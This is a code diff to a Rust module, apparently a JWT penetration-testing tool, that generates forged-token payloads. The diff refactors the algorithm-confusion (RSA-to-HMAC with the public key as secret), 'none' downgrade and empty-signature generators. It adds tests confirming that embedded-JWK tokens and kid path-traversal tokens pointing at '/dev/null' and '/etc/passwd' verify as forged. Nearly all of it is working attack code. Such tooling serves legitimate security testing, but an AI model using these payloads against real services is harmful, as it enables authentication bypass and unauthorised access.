@@ -22,18 +22,18 @@ fn encode_header_with_claims(header: &serde_json::Value, claims_part: &str) -> R
 }
 
 /// Build a header.payload signing input from a header JSON value and an existing claims part.
-fn signing_input(header: &serde_json::Value, claims_part: &str) -> Result<String> {
+fn build_signing_input(header: &serde_json::Value, claims_part: &str) -> Result<String> {
     let header_json = serde_json::to_string(header)?;
     let encoded_header = general_purpose::URL_SAFE_NO_PAD.encode(header_json.as_bytes());
     Ok(format!("{encoded_header}.{claims_part}"))
 }
 
 /// Sign an arbitrary signing input with HS256 and return a JWT-formatted token (header.payload.sig).
-fn sign_hs256(signing_input: &str, secret: &[u8]) -> String {
-    let mut mac = hmac_sha256::HMAC::mac(signing_input.as_bytes(), secret);
+fn sign_hs256(input: &str, secret: &[u8]) -> String {
+    let mut mac = hmac_sha256::HMAC::mac(input.as_bytes(), secret);
     let sig_b64 = general_purpose::URL_SAFE_NO_PAD.encode(mac.as_slice());
     mac.zeroize();
-    format!("{signing_input}.{sig_b64}")
+    format!("{input}.{sig_b64}")
 }
 
 /// Read the original `alg` value from a JWT header (without verifying anything).
@@ -141,46 +141,39 @@ pub fn generate_alg_confusion_payload(
 
     let mut payloads = Vec::new();
 
-    // Header variants — HMAC downgrade and `none` downgrade.
-    let downgrade_algs = [hmac_target, "none"];
-    for alg in downgrade_algs {
-        let header = json!({
-            "alg": alg,
-            "typ": "JWT",
-        });
-        if let Some(pem) = public_key {
-            // Real working attack: sign with the public-key bytes as the HMAC secret.
-            // Only meaningful for HMAC downgrades; skip for `none`.
-            if alg != "none" {
-                let input = signing_input(&header, claims_part)?;
-                let mac = match alg {
-                    "HS256" => {
-                        let mut m = hmac_sha256::HMAC::mac(input.as_bytes(), pem.as_bytes());
-                        let out = m.to_vec();
-                        m.zeroize();
-                        out
-                    }
-                    _ => {
-                        // For HS384/HS512 fall back to the jsonwebtoken crate by
-                        // pretending the PEM bytes are an opaque secret.
-                        let algo = match alg {
-                            "HS384" => jsonwebtoken::Algorithm::HS384,
-                            _ => jsonwebtoken::Algorithm::HS512,
-                        };
-                        let key = jsonwebtoken::EncodingKey::from_secret(pem.as_bytes());
-                        let sig = jsonwebtoken::crypto::sign(input.as_bytes(), &key, algo)?;
-                        // jsonwebtoken returns base64-encoded signature already, decode to bytes
-                        general_purpose::URL_SAFE_NO_PAD.decode(sig.as_bytes())?
-                    }
-                };
-                let sig_b64 = general_purpose::URL_SAFE_NO_PAD.encode(&mac);
-                payloads.push(format!("{input}.{sig_b64}"));
-                continue;
-            }
+    // HMAC downgrade variant: signed with public-key bytes if provided, else
+    // emitted unsigned (header.payload only).
+    let hmac_header = json!({ "alg": hmac_target, "typ": "JWT" });
+    match public_key {
+        Some(pem) => {
+            let input = build_signing_input(&hmac_header, claims_part)?;
+            let sig_b64 = match hmac_target {
+                "HS256" => {
+                    let mut m = hmac_sha256::HMAC::mac(input.as_bytes(), pem.as_bytes());
+                    let out = general_purpose::URL_SAFE_NO_PAD.encode(m.as_slice());
+                    m.zeroize();
+                    out
+                }
+                other => {
+                    let algo = match other {
+                        "HS384" => jsonwebtoken::Algorithm::HS384,
+                        _ => jsonwebtoken::Algorithm::HS512,
+                    };
+                    let key = jsonwebtoken::EncodingKey::from_secret(pem.as_bytes());
+                    // jsonwebtoken returns the base64url-encoded signature directly.
+                    jsonwebtoken::crypto::sign(input.as_bytes(), &key, algo)?
+                }
+            };
+            payloads.push(format!("{input}.{sig_b64}"));
         }
-        // Fallback: emit header.payload without signature.
-        payloads.push(encode_header_with_claims(&header, claims_part)?);
+        None => {
+            payloads.push(encode_header_with_claims(&hmac_header, claims_part)?);
+        }
     }
+
+    // `none` downgrade — never signed regardless of public_key.
+    let none_header = json!({ "alg": "none", "typ": "JWT" });
+    payloads.push(encode_header_with_claims(&none_header, claims_part)?);
 
     info!(
         "Generated algorithm confusion payloads: {} -> {} (+none)",
@@ -228,7 +221,7 @@ pub fn generate_jwk_embed_payload(token: &str) -> Result<String> {
         "jwk": jwk,
     });
 
-    let input = signing_input(&header, claims_part)?;
+    let input = build_signing_input(&header, claims_part)?;
     let pem = private_key
         .to_pkcs8_pem(rsa::pkcs8::LineEnding::LF)
         .map_err(|e| anyhow::anyhow!("Failed to export private key: {}", e))?
@@ -272,7 +265,7 @@ pub fn generate_kid_traversal_payload(token: &str) -> Result<Vec<String>> {
             "typ": "JWT",
             "kid": kid,
         });
-        let input = signing_input(&header, claims_part)?;
+        let input = build_signing_input(&header, claims_part)?;
         payloads.push(sign_hs256(&input, secret));
     }
 
@@ -329,12 +322,8 @@ pub fn generate_b64_payload(token: &str) -> Result<Vec<String>> {
 /// algorithm is not explicitly `none`. The original header is preserved so
 /// the server still sees its expected `alg`.
 pub fn generate_empty_sig_payload(token: &str) -> Result<Vec<String>> {
-    let parts: Vec<&str> = token.split('.').collect();
-    if parts.len() < 2 {
-        return Err(anyhow::anyhow!("Invalid token format"));
-    }
-    let header_b64 = parts[0];
-    let claims_part = parts[1];
+    let claims_part = extract_claims_part(token)?;
+    let header_b64 = token.split('.').next().unwrap_or("");
 
     let payloads = vec![
         // Empty signature segment
@@ -968,6 +957,138 @@ mod tests {
                 }
             }
             false
+        }));
+    }
+
+    #[test]
+    fn test_generate_jwk_embed_payload_signature_verifies() {
+        // Generate the payload, then use the embedded public key to verify the signature.
+        let token = generate_jwk_embed_payload(DUMMY_TOKEN).expect("jwk_embed should succeed");
+        let parts: Vec<&str> = token.split('.').collect();
+        assert_eq!(parts.len(), 3, "expected 3-part token");
+
+        let header = get_header_from_token(&token).expect("decode header");
+        let jwk = header.get("jwk").expect("jwk header present");
+        assert_eq!(jwk.get("kty").unwrap().as_str(), Some("RSA"));
+        let n_b64 = jwk.get("n").unwrap().as_str().unwrap();
+        let e_b64 = jwk.get("e").unwrap().as_str().unwrap();
+
+        // Reconstruct the public key from the embedded n/e and verify the signature.
+        use jsonwebtoken::{Algorithm, DecodingKey, Validation};
+        let n_bytes = URL_SAFE_NO_PAD.decode(n_b64).unwrap();
+        let e_bytes = URL_SAFE_NO_PAD.decode(e_b64).unwrap();
+        let key = DecodingKey::from_rsa_raw_components(&n_bytes, &e_bytes);
+        let mut validation = Validation::new(Algorithm::RS256);
+        validation.validate_exp = false;
+        validation.required_spec_claims.clear();
+        // Use jsonwebtoken::decode to verify signature against the embedded key.
+        let result = jsonwebtoken::decode::<serde_json::Value>(&token, &key, &validation);
+        assert!(
+            result.is_ok(),
+            "signature should verify against the embedded jwk: {:?}",
+            result.err()
+        );
+    }
+
+    #[test]
+    fn test_generate_kid_traversal_signed_with_empty_secret() {
+        let payloads =
+            generate_kid_traversal_payload(DUMMY_TOKEN).expect("kid_traversal should succeed");
+        assert!(!payloads.is_empty());
+
+        // Every payload should HS256-verify against an empty secret.
+        for p in &payloads {
+            let parts: Vec<&str> = p.split('.').collect();
+            assert_eq!(parts.len(), 3, "kid_traversal payload must be 3-part");
+            let signing_input = format!("{}.{}", parts[0], parts[1]);
+            let expected = hmac_sha256::HMAC::mac(signing_input.as_bytes(), b"");
+            let expected_b64 = URL_SAFE_NO_PAD.encode(expected.as_slice());
+            assert_eq!(
+                parts[2], expected_b64,
+                "HS256 signature with empty secret must match for payload {p}"
+            );
+        }
+
+        // /dev/null and /etc/passwd patterns must be represented.
+        let kids: Vec<String> = payloads
+            .iter()
+            .filter_map(|p| {
+                get_header_from_token(p)
+                    .and_then(|h| h.get("kid").and_then(|v| v.as_str().map(String::from)))
+            })
+            .collect();
+        assert!(kids.iter().any(|k| k == "/dev/null"));
+        assert!(kids.iter().any(|k| k.contains("etc/passwd")));
+    }
+
+    #[test]
+    fn test_generate_alg_confusion_picks_matching_hmac_family() {
+        // Build a synthetic source token per alg, check the downgrade target.
+        for (source, expected) in [
+            ("RS256", "HS256"),
+            ("RS384", "HS384"),
+            ("RS512", "HS512"),
+            ("PS384", "HS384"),
+            ("ES512", "HS512"),
+            ("EdDSA", "HS256"),
+        ] {
+            let header = json!({ "alg": source, "typ": "JWT" });
+            let header_b64 =
+                URL_SAFE_NO_PAD.encode(serde_json::to_string(&header).unwrap().as_bytes());
+            let token = format!("{}.eyJzdWIiOiJ4In0.sig", header_b64);
+            let payloads = generate_alg_confusion_payload(&token, None).unwrap();
+            // First payload is the HMAC downgrade, second is `none`.
+            assert!(payloads.len() >= 2);
+            let hmac_hdr = get_header_from_token(&payloads[0]).expect("hmac header should decode");
+            assert_eq!(
+                hmac_hdr.get("alg").unwrap().as_str(),
+                Some(expected),
+                "{} should downgrade to {}",
+                source,
+                expected
+            );
+            let none_hdr = get_header_from_token(&payloads[1]).expect("none header should decode");
+            assert_eq!(none_hdr.get("alg").unwrap().as_str(), Some("none"));
+        }
+    }
+
+    #[test]
+    fn test_generate_alg_confusion_with_public_key_produces_signed_hs256() {
+        // Provide arbitrary "public key" bytes; HS256 token must verify with those bytes.
+        let pem = "-----BEGIN PUBLIC KEY-----\nFAKE\n-----END PUBLIC KEY-----\n";
+        let payloads = generate_alg_confusion_payload(DUMMY_TOKEN, Some(pem)).unwrap();
+        let signed = &payloads[0]; // HS256 downgrade
+        let parts: Vec<&str> = signed.split('.').collect();
+        assert_eq!(parts.len(), 3);
+        let input = format!("{}.{}", parts[0], parts[1]);
+        let expected = hmac_sha256::HMAC::mac(input.as_bytes(), pem.as_bytes());
+        let expected_b64 = URL_SAFE_NO_PAD.encode(expected.as_slice());
+        assert_eq!(parts[2], expected_b64);
+    }
+
+    #[test]
+    fn test_generate_empty_sig_payload_variants() {
+        let payloads = generate_empty_sig_payload(DUMMY_TOKEN).expect("ok");
+        assert_eq!(payloads.len(), 3);
+        assert!(payloads.iter().any(|p| p.ends_with('.')));
+        assert!(payloads.iter().any(|p| p.ends_with(".null")));
+        // The no-trailing-dot variant has 2 dots only? No — it's 1 dot, header.payload.
+        assert!(payloads.iter().any(|p| p.matches('.').count() == 1));
+    }
+
+    #[test]
+    fn test_generate_crit_and_b64_payloads_emit_expected_headers() {
+        let crit = generate_crit_payload(DUMMY_TOKEN).expect("crit ok");
+        assert!(crit.iter().all(|p| {
+            get_header_from_token(p)
+                .and_then(|h| h.get("crit").cloned())
+                .is_some()
+        }));
+
+        let b64 = generate_b64_payload(DUMMY_TOKEN).expect("b64 ok");
+        assert!(b64.iter().all(|p| {
+            get_header_from_token(p).and_then(|h| h.get("b64").and_then(|v| v.as_bool()))
+                == Some(false)
         }));
     }
 }
